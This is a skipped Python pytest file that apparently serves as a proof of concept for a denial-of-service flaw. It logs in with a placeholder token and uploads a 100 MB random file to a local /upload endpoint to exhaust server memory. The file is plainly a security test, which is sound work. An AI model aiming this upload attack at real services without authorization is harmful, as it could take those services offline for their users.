import pytest
pytest.skip("requires running server and valid token", allow_module_level=True)
import requests
import os

# This test demonstrates the denial-of-service vulnerability.
# It attempts to upload a very large file to exhaust server memory.

# --- Configuration ---
# The target URL of the application
BASE_URL = "http://localhost:8000"
# A valid access token for the application
ACCESS_TOKEN = "YOUR_TOKEN" # Replace with a valid token from your application
# The name of the large file to create
LARGE_FILE_NAME = "large_file.txt"
# The size of the large file to create (in bytes)
# Note: This may need to be adjusted depending on the server's memory.
LARGE_FILE_SIZE = 1024 * 1024 * 100  # 100 MB

# --- Test ---
def test_dos_large_file():
    """
    Attempts to upload a large file to the server.
    """
    # Create a large file
    with open(LARGE_FILE_NAME, "wb") as f:
        f.write(os.urandom(LARGE_FILE_SIZE))

    # Authenticate to the application
    session = requests.Session()
    login_payload = {"token": ACCESS_TOKEN}
    login_response = session.post(f"{BASE_URL}/login", data=login_payload)
    if login_response.status_code != 200:
        print(f"Login failed with status code {login_response.status_code}")
        os.remove(LARGE_FILE_NAME)
        return

    # Upload the large file
    upload_url = f"{BASE_URL}/upload"
    with open(LARGE_FILE_NAME, "rb") as f:
        files = {"file": (LARGE_FILE_NAME, f, "application/octet-stream")}
        try:
            upload_response = session.post(upload_url, files=files, data={"directory": ""})
            if upload_response.status_code == 200:
                print("Large file uploaded successfully.")
            else:
                print(f"Large file upload failed with status code {upload_response.status_code}")
        except requests.exceptions.ConnectionError as e:
            print(f"Vulnerability confirmed: The server connection was lost. Error: {e}")

    # Clean up the large file
    os.remove(LARGE_FILE_NAME)

if __name__ == "__main__":
    test_dos_large_file()
